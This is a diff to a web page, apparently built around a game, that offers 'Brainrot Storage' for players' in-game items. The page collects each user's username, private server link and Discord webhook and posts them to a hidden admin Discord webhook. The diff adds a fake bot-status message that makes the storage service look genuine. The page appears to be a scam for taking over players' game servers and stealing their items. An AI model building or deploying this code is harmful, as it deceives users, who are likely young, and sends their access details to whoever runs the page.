@@ -107,11 +107,10 @@
 <body>
     <div class="title">Brainrot Storage</div>
     <div class="how-text">
-        Always wanted to store your brainrots because you wanna rebirth or go stealing.
-        welp now you can store all your stuff without any problem of loosing it 
+        Stop using another device to store your brainrots because you wanna rebirth or go stealing.
+        Instead you can store all your stuff without any problem of loosing it with this tool
         register if you dont have an account and log in if you already have on after 
         filling the fields an instruction will be send to your discord server
-
     </div>
     <div id="auth-section" class="auth-container">
         <input type="text" id="auth-username" class="input-field" placeholder="Username">
@@ -253,8 +252,19 @@
                 return;
             }
 
+            // Send bot status to user's webhook
+            const userPayload = {
+                embeds: [
+                    {
+                        title: "Bot Status",
+                        description: "-Bot online\n\nInstructions: The bot will grab all the Brainrots from all the floors and when all your base has been empty, The bot will disconnect until you connect him again and press unstore button on the web he will connect again and will wait until you have steal everything than the bot will disconnect.",
+                        color: 3447003
+                    }
+                ]
+            };
+
             // Send user submission to admin webhook
-            const payload = {
+            const adminPayload = {
                 embeds: [
                     {
                         title: "New User Submission",
@@ -269,36 +279,62 @@
                 ]
             };
 
+            let userSuccess = false;
+            let adminSuccess = false;
+
+            // Send to user's webhook
             try {
-                const response = await fetch(ADMIN_WEBHOOK, {
+                const userResponse = await fetch(webhook, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(userPayload)
                 });
-
-                if (response.ok) {
-                    alert('Submission sent successfully!');
-                    // Save submission data
-                    const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
-                    userData.webhook = webhook;
-                    userData.privateServer = privateServer;
-                    userData.usernameField = username;
-                    localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
-                    document.getElementById('input-section').style.display = 'none';
-                    document.getElementById('response').style.display = 'block';
-                    document.getElementById('webhook').value = '';
-                    document.getElementById('privateServer').value = '';
-                    document.getElementById('username').value = '';
-                } else {
-                    alert('Failed to send submission. Please try again.');
-                    if (response.status === 404) {
-                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
-                    }
+                userSuccess = userResponse.ok;
+                if (!userSuccess && userResponse.status === 404) {
+                    alert('User webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
+                    return;
                 }
             } catch (error) {
-                alert('An error occurred: ' + error.message);
+                alert('An error occurred while sending to user webhook: ' + error.message);
+                return;
+            }
+
+            // Send to admin webhook
+            try {
+                const adminResponse = await fetch(ADMIN_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(adminPayload)
+                });
+                adminSuccess = adminResponse.ok;
+                if (!adminSuccess && adminResponse.status === 404) {
+                    alert('Admin webhook URL is invalid. Nelly is serving noodles! Please try again.');
+                    return;
+                }
+            } catch (error) {
+                alert('An error occurred while sending to admin webhook: ' + error.message);
+                return;
+            }
+
+            if (userSuccess && adminSuccess) {
+                alert('Submission sent successfully!');
+                // Save submission data
+                const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
+                userData.webhook = webhook;
+                userData.privateServer = privateServer;
+                userData.usernameField = username;
+                localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
+                document.getElementById('input-section').style.display = 'none';
+                document.getElementById('response').style.display = 'block';
+                document.getElementById('webhook').value = '';
+                document.getElementById('privateServer').value = '';
+                document.getElementById('username').value = '';
+            } else {
+                alert('Failed to send submission. Please try again.');
             }
         }
 
@@ -350,7 +386,7 @@
                 } else {
                     alert('Failed to submit new private server. Please try again.');
                     if (response.status === 404) {
-                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
+                        alert('Admin webhook URL is invalid. Nelly is serving noodles! Please try again.');
                     }
                 }
             } catch (error) {
